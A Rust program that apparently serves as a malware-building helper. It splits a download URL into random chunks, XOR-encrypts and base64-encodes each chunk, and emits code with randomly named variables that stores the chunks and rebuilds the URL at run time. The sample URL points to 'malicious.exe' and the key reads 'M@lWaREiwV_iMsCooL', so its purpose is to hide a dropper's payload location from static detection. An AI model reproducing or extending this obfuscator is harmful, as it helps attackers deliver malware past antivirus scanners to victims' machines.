#![allow(deprecated)]

use rand::{Rng, distr::{Alphanumeric, Uniform}};
use base64::{encode, decode};
use std::string::String;


fn random_var_name() -> String {
    let first_char = rand::thread_rng()
        .sample_iter(Uniform::new_inclusive(b'a', b'z').unwrap())
        .take(1)
        .map(char::from)
        .collect::<String>();
    let length = rand::thread_rng().gen_range(4..=9); // total length 5-10 including first char
    let rest: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .map(char::from)
        .collect();
    first_char + &rest
}

// XOR-based encryption with a key
fn xor_encrypt(input: &str, key: &str) -> String {
    let key_bytes = key.as_bytes();
    let input_bytes = input.as_bytes();
    let mut result = Vec::new();
    
    for (i, &byte) in input_bytes.iter().enumerate() {
        result.push(byte ^ key_bytes[i % key_bytes.len()]);
    }
    
    encode(result)
}

// XOR-based decryption with a key
fn xor_decrypt(input: &str, key: &str) -> String {
    let decoded = decode(input).expect("Failed to decode base64");
    let key_bytes = key.as_bytes();
    let mut result = Vec::new();
    
    for (i, &byte) in decoded.iter().enumerate() {
        result.push(byte ^ key_bytes[i % key_bytes.len()]);
    }
    
    String::from_utf8(result).expect("Failed to convert to string")
}

// split URL into 3-5 parts
fn split_url(url: &str) -> Vec<String> {
    let num_parts = rand::thread_rng().gen_range(3..=5);
    let url_len = url.len();
    let mut parts = Vec::new();
    let mut start = 0;
    
    for _ in 0..num_parts-1 {
        let part_len = rand::thread_rng().gen_range(url_len/num_parts/2..=url_len/num_parts);
        if start + part_len <= url_len {
            parts.push(url[start..start+part_len].to_string());
            start += part_len;
        }
    }
    
    if start < url_len {
        parts.push(url[start..].to_string());
    }
    
    parts
}

// encryption algorithm
pub fn encryption_algorithm(url: &str, key: &str) -> (Vec<(String, String)>, String) {
    let parts = split_url(url);
    let mut encrypted_parts = Vec::new();
    
    for part in parts {
        let var_name = random_var_name();
        let encrypted = xor_encrypt(&part, key);
        encrypted_parts.push((var_name, encrypted));
    }
    
    let mut code = String::new();
    for (var_name, encrypted) in &encrypted_parts {
        code.push_str(&format!("let {} = \"{}\";\n", var_name, encrypted));
    }
    
    (encrypted_parts, code)
}

pub fn decryption_algorithm(encrypted_parts: &[(String, String)], key: &str) -> (String, String) {
    let mut decrypted_parts = Vec::new();
    let mut code = String::new();
    
    for (var_name, encrypted) in encrypted_parts {
        let decrypted = xor_decrypt(encrypted, key);
        decrypted_parts.push(decrypted.clone());
        code.push_str(&format!("let decrypted_{} = xor_decrypt({}, \"{}\");\n", var_name, var_name, key));
    }
    
    let final_url = decrypted_parts.join("");
    code.push_str(&format!("let final_url = format!(\"{}\", {});\n", 
        decrypted_parts.iter().map(|_| "{}").collect::<Vec<_>>().join(""),
        encrypted_parts.iter().map(|(var_name, _)| format!("decrypted_{}", var_name)).collect::<Vec<_>>().join(", ")));
    
    (final_url, code)
}

fn main() {
    let url = "https://testsite.com/files/malicious.exe";
    // replace any random key -> 
    let key = "M@lWaREiwV_iMsCooL";
    
    
    let (encrypted_parts, enc_code) = encryption_algorithm(url, key);
    println!("Encrypted parts code:\n{}", enc_code);
    
    let (decrypted_url, dec_code) = decryption_algorithm(&encrypted_parts, key);
    println!("Decryption code:\n{}", dec_code);
    println!("Decrypted URL: {}", decrypted_url);
}